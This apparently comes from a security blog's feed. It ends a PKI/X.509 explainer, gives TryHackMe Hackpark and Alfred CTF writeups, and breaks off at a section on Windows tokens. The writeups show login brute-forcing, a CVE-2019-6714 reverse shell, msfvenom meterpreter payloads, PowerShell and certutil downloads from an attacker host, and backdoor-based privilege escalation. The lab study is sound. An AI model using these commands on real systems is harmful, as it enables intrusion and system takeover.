association between identities such as organizations, individuals or websites, and their cryptographic key pairs.
&lt;br&gt;&lt;br&gt;An _X.509 certificate_ essentially contains those:
- Identity&apos;s name, address, email,etc.
- Identity&apos;s public-key.
- The _Issuer_ of the certificate.
- The _encrypted hash_ of the certificate.

If Robert can find a certificate that binds Ashley&apos;s name with her company BBSec, he can confidently tell that it is the correct
certificate he was looking for.
&lt;br&gt;&lt;br&gt;There are two more fields above, which are _Issuer_ and _encrypted hash_. We will come to that later.

Common applications that use X.509 certificates:
- TLS/SSL and HTTPS for encrypted and authenticated web browsing
- S/MIME Protocol for encrypted and signed email. 
- Document signing
- Client authentication
- Goverment-issued electronic ID

# CERTIFICATE AUTHORITIES

However, what if Robert finds more than one certificate claiming to have Ashley&apos;s public key? Now which one is the right one?
I can easily create a certificate identical to Ashley&apos;s and put my public-key in it.
We need a mechanism to verify that the certificate assigned to a specific identity is one of its kind.
&lt;br&gt;&lt;br&gt;We have what we call **_Certificate Authorities (CAs)_** to solve this problem.  There are dozens of organizations that we 
trust to be authoritative. All operating systems and browsers come with built-in configured CAs. If a CA claims
a certificate is authentic, we will believe it. 
&lt;br&gt;&lt;br&gt;However, how does a CA indicate that the certificate in question is authentic?
By _signing_ it digitally. The signature of the CA must be checked to verify the authenticity of a certificate.
&lt;br&gt;&lt;br&gt; In the definition of an X.509 certificate above, there were two more fields left unexplained. _Issuer_ and _Encrypted Hash_.
- Issuer: The name of the organization (CA) that issued the certificate.
- Encrypted Hash: the digital signature of the CA.

Let us continue to the Robert and Ashley example above:

1. Robert obtains certificate A that claims to be Ashley&apos;s certificate and issued by X.
2. To verify that certificate A is authentic by verifying CA&apos;s signature, Robert gets the public key of X from somewhere, then
decrypts the _encrypted hash_, the digital signature, inside of certificate A.

The question is that Robert just downloaded X&apos;s certificate from somewhere, so how can he tell that it is also authentic? The answer is, by looking
at the _Issuer_ of X, which is Y. Now, he must find the Y certificate to verify the signature on the X certificate. We can continue
to do that endlessly. It becomes an endless loop, and we have to stop at one point.
&lt;br&gt;&lt;br&gt;To solve this problem we have what we call the **_Root CAs_**.

# WHAT IS A ROOT CA?

A **_top-level, root CA_** is a certificate authority that sits on the top of the authority hierarchy. CAs can sign their own certificates. These
are what we call _self-signed certificates_. Since it is not possible to validate self-signed certificates with PKI, Root CAs 
distribute their keys _out-of-band_ (e.g. out-of-band distribution means non-electronic distributing, such as going to their offices
and getting their public key in person).
&lt;br&gt;&lt;br&gt;However, it would be harsh to go to the Root CAs office and collect their public key when you want to send an 
email to somebody. Web browsers come with more than 30 Root CAs. The browsers&apos; distributors are deciding who are truthful. By
using their browser, you trust their choice.
&lt;br&gt;&lt;br&gt;Let us get back to the Ashley and Robert example. If we assume that the certificate Y is a _self-signed_ certificate and the organization Y
is indeed a _Root CA_, Robert can trust certificate A since X trusts A and Y trusts X.

# TERMINOLOGIES

## X.509
The protocol&apos;s itself.
## PKIX
Stands for **P**ublic  **K**ey **I**nfrastructure **X**.509
## [Abstract Syntax Notation One (ASN.1)](https://en.wikipedia.org/wiki/ASN.1)
It is the syntax used to describe things in an X.509 certificate. For instancee, if the certificates were written in JSON, 
ASN.1 would be the syntax for the schema (This example is over-simplified).
Using ASN.1, it is possible to define data structures that 
can be transmitted over the network independently of software or hardware.
### DER, PEM, XER, PER, BER, CER
Those are some of the popular encoding rules for ASN.1. 
&lt;br&gt;_DER_ and _PEM_ are the most used.
## Algorithm
When the context is the PKI, it refers to cryptographic algorithms like &quot;SHA1 with DSA&quot;, &quot;SHA1 with RSA&quot;, etc. In order to
achieve cryptographic signing, first, we need to hash the data, then encrypt the hash. &quot;SHA1 with RSA&quot; would indicate that the
data hashed with SHA1 and encrypted with RSA.
## [Object Identifiers (OIDs)](https://en.wikipedia.org/wiki/Object_identifier)
Instead of using English to describe things in a X.509 certificate, _OIDs_ are being used.
For instance, in a certificate 
instead of referring to the encryption field as &quot;RSA&quot;, which would be a string value, you would see its&apos; integer OID value &quot;1.2.840.11359&quot;.
&lt;br&gt;[You can find the list of the registered OIDs here.](https://www.alvestrand.no/objectid/top.html) 
## [Privacy Enhanced Mail (PEM)](https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail)
If you hear PEM, it usually refers to [DER](https://asecuritysite.com/encryption/sigs3?a0=304e301006072a8648ce3d020106052b81040021033a0004eada93be10b2449e1e8bb58305d52008013c57107c1a20a317a6cba7eca672340c03d1d2e09663286691df55069fa25490c9dd9f9c0bb2b5). 
PEM is further encoded version of DER to base64.
Using PEM encoding can assist transmission over media that is sensitive to textual encodings.
## [Distinguished Name (DN)](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names?redirectedfrom=MSDN)
Just referring someone with his/her name would not be helpful to identify someone. 
_DN_ is used to identify someone uniquely by dividing attributes into fields like **CN=Burak, DC=bbsec, DC=COM**.
## [Simple PKI (SPKI)](https://crypto.stackexchange.com/questions/790/need-an-introduction-to-spki-or-spki-for-dummies)
The PKI we were discussing ([RFC 5280](https://www.ietf.org/rfc/rfc5280.txt)) binds a certificate with _distinguished name_.
SPKI ([RFC 2692](https://datatracker.ietf.org/doc/html/rfc2692)) binds public key to a set of permissions. Not commonly used.

## [Public Key Cryptography Standrat (PKCS)](https://www.encryptionconsulting.com/public-key-cryptography-standards/)
_PKCS_ is a set of standrats for PKI from 1 to 15. The PKCS standarts listed below are the most common and important ones.

- PKCS #1: RSA Cryptograpgy Standart
- PKCS #3: Diffie-Hellman Key Agreement Standard
- PKCS #7/CMS: Cryptographic Message Syntax Standard 
- PKCS #9: Selected Object Classes and Attribute Types
- PKCS #10: Certification Request Syntax Standard
- PKCS #12: Personal Information Exchange Syntax Standard

## [Certificate Revocation List (CLR)](https://en.wikipedia.org/wiki/Certificate_revocation_list)
These lists are published by some authorities&apos; servers to indicate which certificates have been revoked.
If you were to lose your credit card for whatever reason, you would like to revocate your credit card.
It works the same for the certificates too. You might lose your private key for whatever reason, or it can get stolen. In this case, 
you would like to revocate your X.509 certificate.

## [Online Certificate Status Protocol (OCSP)](https://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol)
An internet protocol used for gathering the revocation status of an X.509 certificate.

## [Certificate Signing Requests (CSR)](https://www.namecheap.com/support/knowledgebase/article.aspx/337/67/what-is-a-certificate-signing-request-csr/)
In order to get a certificate signed by a Root CA, a _Certificate Signing Request_ should be made to a Root CA.
There are meta-data that needs to be bundled which is specified by PKCS#10

&lt;br&gt;
Further reading and practice about how to create digital signatures and x.509 certificates furthermore how to sign and 
verify a document or certificate with [_OpenSSL can be found here_](https://www.bbsec.net/2022/01/05/OpenSSL-CLI-Tool/).
</description>
        <pubDate>Sat, 01 Jan 2022 16:00:00 +0000</pubDate>
        <link>http://localhost:4000/2022/01/01/public-key-infrastructure/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/01/01/public-key-infrastructure/</guid>
        
        <category>PKI</category>
        
        <category>PKC</category>
        
        <category>x509</category>
        
        <category>Cryptography</category>
        
        
      </item>
    
      <item>
        <title>THM Hackpark CTF Writeup</title>
        <description>[**Solve Yourself &gt;&gt;**](https://tryhackme.com/room/hackpark)

# ENUMERATION

Run Network Mapper (**nmap**) on Hackpark machine to discover opened ports and services.   

Full command : 
{% highlight bash %}
nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}
{% endhighlight %}

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-sV                     | Probe open ports to determine service/version info     |
|-sS                     | SYN, half TCP scan                                     |
|-O                      | Enable OS detection                                    |
|-T4                     | T{0-5} Set scan speed, higher is faster                |
|-p-                     | Scan all 65536 ports                                   |
|-Pn                     | Skip host discovery                                    |
|-oN                     | Write output to a file                                 |

Output of the scan:
{% highlight bash %}
# Nmap 7.92 scan initiated Thu Dec 30 14:40:55 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN hackpark.nmap 10.10.123.142
Nmap scan report for 10.10.123.142
Host is up (0.033s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 14:43:54 2021 -- 1 IP address (1 host up) scanned in 179.18 seconds
{% endhighlight %}
Two ports opened:

## Port 3389 ssl/ms-wbt-server?
Port 3389 is running an [RDP](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) service.
However, it is not possible to exploit it since we do not have any information about the version of the service.

## Port 80 http Microsoft IIS httpd 8.5
[**Microsoft IIS**](https://en.wikipedia.org/wiki/Internet_Information_Services) web server is running on port 80.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/1.png)&lt;br&gt;
&lt;br&gt;&lt;br&gt;Let us quickly check the [robots.txt](https://www.cloudflare.com/learning/bots/what-is-robots.txt/) to see if we can find something interesting.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/3.png)&lt;br&gt;
Nothing fancy here. Let us move on.
&lt;br&gt;&lt;br&gt;[Dirsearch](https://github.com/maurosoria/dirsearch) can help us to enumerate subdirectories of the webserver.
Frameworks like **GoBuster** and **DirBuster** are also an option.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/2.png)&lt;br&gt;
The **/admin** directory might be interesting. However, the request to the directory gets redirected to a **.aspx** file 
which is probably a login form.
&lt;br&gt;&lt;br&gt;![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/4.png)&lt;br&gt;
We will have to launch a [brute-force](https://www.fortinet.com/resources/cyberglossary/brute-force-attack) attack in order to
gain access to the backend panel.
&lt;br&gt;&lt;br&gt;There is only one blog post published on the main page, and the author of it is the **ADMINISTRATOR**. 
So we can assume that the only user registered to the panel is the admin’s itself.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/5.png)&lt;br&gt;

# EXPLOITATON

## Brute-Forcing the Panel
In order to create continuous HTTP requests, we have to know how the HTTP request looks.
Launch the [**Burp Suite**](https://www.geeksforgeeks.org/what-is-burp-suite/) to examine the HTTP POST request sent 
when a login attempt occurs.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/6.png)_HTTP Post Request_&lt;br&gt;

There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.
1. [**application/x-www-form-urlencoded**](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4) header : Encoding type
2. **Username** : Username field
3. **Password** : Password Field

However, we need to include all the data section when posting the request. Otherwise we cannot get a healthy
response from the webserver.
I will use [**ffuf**](https://cybersecnerds.com/ffuf-everything-you-need-to-know/) to create POST requests toward the web server.
You can use any fuzzer tool like **THC Hydra**, **Burp Suite** or others. 
&lt;br&gt;Download [**SecLists**](https://github.com/danielmiessler/SecLists) repo with prepeared wordlists included.
Full command:
{% highlight bash %}
ffuf -w ~/Folders/pentest/SecLists/Passwords/probable-v2-top1575.txt:W1 -u &quot;http://10.10.123.142/Account/login.aspx?ReturnURL=/admin/&quot; -data &quot; \_\_VIEWSTATE=RH2j6pTwkTpekqaGFxbyyqhRtNI0NqgguLfakdexSgccBsTJEspUlTZqAM4QgzNfGiTveKSyUR8zQcskqfuAHSnpcldHQ9xwsDFI7TPd9qleqBeLqjTEaf0uWEXMNHGHBar%2Fd4Tpi6vKNeoMnRSF9UgcpGiDPoDm%2BS2kBhsBJqJ47zLb&amp;\_\_EVENTVALIDATION=iHNLSSqcnyAz7PNrH23YgFZ%2FinxPC1MSAVwjbKwwlbPU53tS7MftBm1t2tI37bKFNo1JvXCIgpZCsBc0Hy0zCU6jPybyZAob4Fm3Pmva7gRSUaDNTTb%2F3QgExGwRutGX4FnCQjvfJVEGodEZUU5p4vr8Xj6oe8MdxUtJM0CobBQGfLLs&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=W1&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -fr &quot;Login failed&quot;
{% endhighlight %}

Where:

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-w                      | Dedicated wordlists                                    |
|-u                      | Target URL                                             |
|-data                   | Data which will be sent with the request               |
|-H                      | HTTP headers that will be sent with the request        |
|-fr                     | Regex which will be filtered out                       |

![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/8.png)_Starting the attack_&lt;br&gt;
Since the password is not strong enough, we have managed to crack it in a matter of seconds.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/10.png)_Logging in to the panel as the admin._
&lt;br&gt;&lt;br&gt;
## Searching for Vulnerabilities
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/11.png)_Checking the version of the framework_&lt;br&gt;
After logging in to the panel, under the About tab, we can see the version of the framework is 3.3.6
&lt;br&gt;&lt;br&gt;After gathering the version information, we can check [Exploit-db](https://www.exploit-db.com/exploits) to see
if there is any vulnerability on that version. I will use the **searchsploit** utility, the CLI version
of the Exploit-db.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/12.png)&lt;br&gt;
Multiple different exploits showed up. However, the first one is specifically for the version 3.3.6. We are going to
use that. [Click to read more about _File Path, Directory Traversal_](https://portswigger.net/web-security/file-path-traversal).
&lt;br&gt;&lt;br&gt;
## Hacking Into the User&apos;s Shell
Download the [CVE-2019-6714](https://www.exploit-db.com/exploits/46353) exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/13.png)_Editing 46353.cs file_&lt;br&gt;
Rename the file as **PostView.ascx**.
&lt;br&gt;&lt;br&gt;Navigate to the Content tab, then click on the blog post to access the editor.
Interact with the file manager to upload the exploit.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/13-1.png)_File manager icon_&lt;br&gt;
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/14.png)_Uploading the exploit_&lt;br&gt;
&lt;br&gt;Make sure the post is saved to its&apos; newer version.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/15.png)_Updating the blogpost_&lt;br&gt;
&lt;br&gt;Start a **netcat** listener on your machine with the port that is defined in the exploit.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/16.png)&lt;br&gt;
&lt;br&gt;To trigger the **PostView.ascx** file and get the reverse shell send a GET request to this
URL: **http://{MACHINE IP}/?theme=../../App_Data/files**&lt;br&gt;
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/17.png)&lt;br&gt;
&lt;br&gt;Exploit worked like a charm, and we got our shell.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/18.png)&lt;br&gt;
&lt;br&gt;
## Upgrading to the Meterpreter
Since the shell we got is a poor Netcat shell, it would be better to get a **meterpreter** session
to facilitate our scans in the system.&lt;br&gt;&lt;br&gt;
Let&apos;s create a meterpreter reverse shell binary with [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/). 
After successful creation, we need to upload this binary to the target machine. The shortest way to 
do it is to start a Python server.

{% highlight powershell %}
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={THM IP} LPORT={SOME FREE PORT} -f exe revshell.exe
{% endhighlight %}

{% highlight python %}
sudo python -m http.server 80
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/19.png)_Creating meterpreter backdoor and starting a Python server_&lt;br&gt;
&lt;br&gt;Download the backdoor to the target system with the following Powershell commands:
{% highlight powershell %}
cd &quot;C:\Windows\Temp&quot;
mkdir myfolder
cd myfolder
powershell -c &quot;Invoke-WebRequest http://{THM IP}:{PORT}/{FILE_NAME} -OutFile .\revshell.exe&quot;
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/20.png)&lt;br&gt;
&lt;br&gt;&lt;br&gt;We need to have a listener to accept incoming meterpreter connection.
{% highlight bash %}
msfconsole -q
handler -p windows/meterpreter/reverse_tcp -H {THM IP} -P {THE PORT DEFINED IN THE BACKDOOR}
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/22.png)&lt;br&gt;
&lt;br&gt;Go back to the Netcat console, then run the backdoor as a background process with this command.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/21.png)&lt;br&gt;
&lt;br&gt;Excellent! We got the meterpreter session.
Right now, our control on the system is much more powerful than before.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/22-2.png)
&lt;br&gt;&lt;br&gt;
## Privilege Escelation
After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
permissions against the system. **PowerUp.ps1** is a program that facilitates fast checks in a windows machine to identify 
any misconfigurations and privilege escalation possibilities.
&lt;br&gt;[**Download PowerUp.ps1**](https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1)
&lt;br&gt;[**PowerSploit GitHub Repo**](https://github.com/PowerShellMafia/PowerSploit)
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/23.png)_Uploading the PowerUp.ps1 Powershell script to the target system._&lt;br&gt;
&lt;br&gt;&lt;br&gt;Since this is a Powershell script, we need to have a Powershell instead of a regular windows command prompt.
&lt;br&gt;-Load the Powershell module and summon it.
&lt;br&gt;-Import the script as a powershell module.
{% highlight powershell %}
Import-Module .\PowerUp.ps1
Invoke-AllChecks
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/24.png)&lt;br&gt;
&lt;br&gt;**InvokeAllChecks** will diagnose any detectable vulnerabilities along with their descriptions.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/25.png)&lt;br&gt;
&lt;br&gt;&lt;br&gt;One of the results is worth paying attention to. There is a Windows Scheduler service autoruns at the system logon. 
The problem is that everyone can modify all the files stored in the directory that contains 
W3Scheduler.exe. Since the scheduler is run with admin privileges, 
I can run my malicious executables with admin privileges by replacing the W3Scheduler.exe.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/26.png)&lt;br&gt;
&lt;br&gt;Some resources for autorun exploitation:
&lt;br&gt;- [Windows Privilege Escalation – Exploiting Autorun](https://steflan-security.com/windows-privilege-escalation-exploiting-autorun/)
&lt;br&gt;- [Privilege Escalation with Autoruns](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries)
&lt;br&gt;&lt;br&gt;Let&apos;s check the the [**DACL(Discretionary Access Control List)**](https://networkencyclopedia.com/discretionary-access-control-list-dacl/) of the &apos;C:\Program Files (x86)\SystemScheduler&apos; with [**icacls**](https://www.techtarget.com/searchwindowsserver/definition/icacls). 
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/27.png)&lt;br&gt;
It is obvious that everyone have modify permission on this folder.
&lt;br&gt;&lt;br&gt; Let&apos;s see what the directory contains along with W3Scheduler.exe
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/28.png)&lt;br&gt;
&lt;br&gt;&lt;br&gt;Replacing the W3Scheduler.exe with a backdoor would not work since it is a virtual box and once
rebooted, it will reset itself to factory settings. That is why we need to dig further to find out how
to walk around this.
&lt;br&gt;&lt;br&gt;There is a log file in the directory, let&apos;s see what is inside.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/29.png)&lt;br&gt;
The scheduler executes a binary called Messages.exe every 23 seconds. 
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/30.png)&lt;br&gt;
This binary in the modifiable directory too. If we create a 
backdoor and put it where Message.exe sits, we can escalate our privileges.
&lt;br&gt;&lt;br&gt;Once again, let us create a meterpreter reverse shell binary.
{% highlight powershell %}
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={THM IP} LPORT={SOME FREE PORT} -f exe revshell.exe
{% endhighlight %}
Then start the python server.
{% highlight python %}
sudo python -m http.server 80
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/31.png)&lt;br&gt;
&lt;br&gt;&lt;br&gt;Start the multi handler listener.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/32.png)&lt;br&gt;
&lt;br&gt;&lt;br&gt;Rename the executable as Messages.exe (I forgot it should be named Messages.exe when creating it). 
Then, replace the real binary with the malicious backdoor.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/33.png)&lt;br&gt;
&lt;br&gt;&lt;br&gt;Sit back and wait for the session to initialize.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/34.png)&lt;br&gt;
Voilà! We are the administrator now.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png)&lt;br&gt;
</description>
        <pubDate>Fri, 31 Dec 2021 18:20:00 +0000</pubDate>
        <link>http://localhost:4000/2021/12/31/thm-hackpark-ctf-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/12/31/thm-hackpark-ctf-writeup/</guid>
        
        <category>TryHackme Machines</category>
        
        <category>ctf</category>
        
        <category>pentesting</category>
        
        <category>metasploit</category>
        
        <category>mindows-privesc</category>
        
        <category>bruteforce</category>
        
        <category>remote-code-execution</category>
        
        <category>directory-traversal</category>
        
        <category>autorun-privesc</category>
        
        
      </item>
    
      <item>
        <title>THM Alfred CTF Writeup</title>
        <description>[**Solve Yourself &gt;&gt;**](https://www.tryhackme.com/room/alfred)

# ENUMERATION

Run Network Mapper (**nmap**) on Alfred machine to discover opened ports and services.   

Full command : 
{% highlight bash %}
nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}
{% endhighlight %}

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-sV                     | Probe open ports to determine service/version info     |
|-sS                     | SYN, half TCP scan                                     |
|-O                      | Enable OS detection                                    |
|-T4                     | T{0-5} Set scan speed, higher is faster                |
|-p-                     | Scan all 65536 ports                                   |
|-Pn                     | Skip host discovery                                    |
|-oN                     | Write output to a file                                 |

Output of the scan:
{% highlight bash %}
# Nmap 7.92 scan initiated Tue Dec 28 09:22:17 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN alfred.nmap 10.10.195.99
Nmap scan report for 10.10.195.99
Host is up (0.030s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 28 09:24:13 2021 -- 1 IP address (1 host up) scanned in 115.63 seconds
{% endhighlight %}

Three ports are opened:
## Port 80 http Microsoft IIS httpd 7.5
Ordinary [**Microsoft IIS**](https://en.wikipedia.org/wiki/Internet_Information_Services) web server.
&lt;br&gt;Nothing fancy here.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/2.png)

## Port 3389 tcpwrapped
**tcpwrapped** means that the remote host closed the connection after completing the TCP three-way handshake without receiving any data.
&lt;br&gt;[**More information here**.](https://secwiki.org/w/FAQ_tcpwrapped)
&lt;br&gt;However, port 3389 typically used for [RDP](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) protocol.

## Port 8080 Jetty 9.4.z-SNAPSHOT

There is a [**Jenkins**](https://www.geeksforgeeks.org/what-is-jenkins/) login prompt on port 8080.
&lt;br&gt;![](/assets/img/posts/tryhackme-alfred-ctf-writeup/3.png)&lt;br&gt;
If you google it, you will see the default login credentials for Jenkins is **admin** for the username and **admin** for the password.
However, the system administrator could have changed the password to a different one. In that case default credentials
would be useless. So we will brute force the credentials for best practice.&lt;br&gt;

# EXPLOITATION

In order to create continuous HTTP requests, we have to know how the HTTP request looks.
Launch the [**Burp Suite**](https://www.geeksforgeeks.org/what-is-burp-suite/) to examine the HTTP POST request sent 
when a login attempt occurs.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/4.png)_Request_&lt;br&gt;&lt;br&gt;
There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.
1. [**application/x-www-form-urlencoded**](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4) : Encoding type
2. **j_username** : Username field
3. **j_password** : Password Field

I will use [**ffuf**](https://cybersecnerds.com/ffuf-everything-you-need-to-know/) to create POST requests toward the web server.
You can use any fuzzer tool like **THC Hydra**, **Burp Suite** or others. 
&lt;br&gt;Download [**SecLists**](https://github.com/danielmiessler/SecLists) repo with prepeared wordlists included.

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-w                      | Dedicated wordlists                                    |
|-u                      | Target URL                                             |
|-data                   | Data which will be sent with the request               |
|-H                      | HTTP headers that will be sent with the request        |
|-fr                     | Regex which will be filtered out                       |


Full command:
{% highlight bash %}
ffuf -w SecLists/Usernames/top-usernames-shortlist.txt:W1,SecLists/Passwords/Common-Credentials/best1050.txt:W2 -u &quot;http://10.10.56.186:8080/j_acegi_security_check&quot; -data &quot;j_username=W1&amp;j_password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -fr &quot;loginError&quot;
{% endhighlight %}

![](/assets/img/posts/tryhackme-alfred-ctf-writeup/6.png)__Cracked the credentials, well done :)__&lt;br&gt;&lt;br&gt;
A possible question would be, why filter out &quot;loginError&quot; string ? 
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/5.png)_Left: Request - Right:Response_&lt;br&gt;&lt;br&gt;
That sent request got a response with [**HTTP 302 status code**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302), which is the status code for redirection.
It means whenever the application receives invalid credentials from the client; the server redirects the client to the &quot;/loginError&quot; URL.
Based on this, as long as the HTTP response does not include &quot;/loginError&quot; in it, it is safe to say we have sent a valid username-password pair
to the server.
&lt;br&gt;&lt;br&gt;
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/7.png)__Login to the Jenkins panel via credentials.__

It is possible to do anything that Jenkins can do since we have an admin portal right now.However, if we could get a shell from the
system, it would be amazing.&lt;br&gt;&lt;br&gt;
The way to get a shell from the system is to make Jenkins transmit and execute code in the system shell.&lt;br&gt;
Click on the first project named as **project**, then click **configure**.
Scroll down to the bottom, and you will see a box that executes the windows command written in it.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/9.png)&lt;br&gt;
On the project page, there is a **Build History** section. It is available to check the output of the batch command that had run.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/8.png)
Now, instead of printing the string value of the user who executes it with the **whoami** command, we have to connect to that shell.

&lt;br&gt;I will use [**Netcat**](https://www.ionos.com/digitalguide/server/tools/netcat/) in this manner. It is required to have Netcat downloaded in both the attacker and the
victim machine.
- Download static [**nc.exe**](https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe) binary for to run it in the victim machine 
- Start a Python3 server in the directory that includes the Netcat static binary file.
&lt;br&gt;Run:
{% highlight shell%}
sudo python3 -m http.server 80
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/10.png)
- Start a Netcat listener in the attacker machine.
&lt;br&gt;Run:
{% highlight shell%}
nc -nvlp {ANY FREE PORT}
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/11.png)
- Download the static binary to the victim machine from the Python web server and run it.
{% highlight powershell%}
certutil.exe -urlcache -split -f http://{THM IP}:80/nc.exe
{% endhighlight %}
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/12.png)
- Click **Build** button on the project page.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/13.png)

A get request was made to the web server.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/14.png)
Then we got the shell.
![](/assets/img/posts/tryhackme-alfred-ctf-writeup/15.png)__We are in, nice progress ;)__
To get user flag, run:
{% highlight powershell %}
type &quot;C:\Users\Bruce\Desktop\user.txt&quot;
{% endhighlight%}

# WINDOWS TOKENS
This machine focuses on the Windows access tokens and escalate privileges with them.

## What is an access token ?

An access token consists of:
- Privileges
- Group SIDs(security identifier)
- User SIDs
amongst other things.
[**Much more detailed information here.**](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)

An [access token](https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly) contains the security 
information for a logon session. The system creates an access token when a user logs on, and every process 
executed on behalf of the user has a copy of the token. The token identifies the user, the user&apos;s groups, 
and the user&apos;s privileges. The system uses the token to control access to securable objects and to control 
the ability of the user to perform various system-related operations on the local computer. 
There are two kinds of access token, **primary** and **impersonation**.
&lt;br&gt;&lt;br&gt;There are two types access tokens, according to [**Windows Docs**](https://docs.microsoft.com/en-us/):
